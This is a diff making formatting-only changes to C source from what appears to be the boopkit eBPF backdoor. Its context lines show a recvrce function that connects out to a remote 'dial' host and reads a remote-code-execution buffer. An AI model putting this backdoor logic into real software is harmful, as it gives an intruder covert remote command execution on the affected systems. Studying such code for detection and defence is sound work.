@@ -26,13 +26,13 @@
 #include <arpa/inet.h>
 #include <bpf/bpf.h>
 #include <bpf/libbpf.h>
+#include <errno.h>
 #include <limits.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
 #include <unistd.h>
-#include <errno.h>
 
 // clang-format off
 #include "boopkit.h"
@@ -80,7 +80,7 @@ int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
 
   int revsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
   if (revsock == -1) {
-    //printf(" XX Socket creation failed\n");
+    // printf(" XX Socket creation failed\n");
     return 1;
   }
 
@@ -89,23 +89,27 @@ int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
   int retval;
   retry.tv_sec = TIMEOUT_SECONDS_RECVRCE;
   retry.tv_usec = 0;
-  retval = setsockopt(revsock, SOL_SOCKET, SO_SNDTIMEO, (struct timeval *)&retry,  sizeof (struct timeval));
+  retval = setsockopt(revsock, SOL_SOCKET, SO_SNDTIMEO,
+                      (struct timeval *)&retry, sizeof(struct timeval));
   if (retval != 0) {
-    printf("Error (%d) setting socket SO_SNDTIMEO: %s\n", retval,  strerror(errno));
+    printf("Error (%d) setting socket SO_SNDTIMEO: %s\n", retval,
+           strerror(errno));
     return 1;
   }
-  retval = setsockopt(revsock, SOL_SOCKET, SO_RCVTIMEO, (struct timeval *)&retry,  sizeof (struct timeval));
+  retval = setsockopt(revsock, SOL_SOCKET, SO_RCVTIMEO,
+                      (struct timeval *)&retry, sizeof(struct timeval));
   if (retval != 0) {
-    printf("Error (%d) setting socket SO_RCVTIMEO: %s\n", retval,  strerror(errno));
+    printf("Error (%d) setting socket SO_RCVTIMEO: %s\n", retval,
+           strerror(errno));
     return 1;
   }
 
   if (connect(revsock, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
-    //printf(" XX Connection SOCK_STREAM refused.\n");
+    // printf(" XX Connection SOCK_STREAM refused.\n");
     return 1;
   }
 
-  //printf("***READ***\n");
+  // printf("***READ***\n");
   char buffer[MAX_RCE_SIZE];
   read(revsock, buffer, MAX_RCE_SIZE);
   close(revsock);
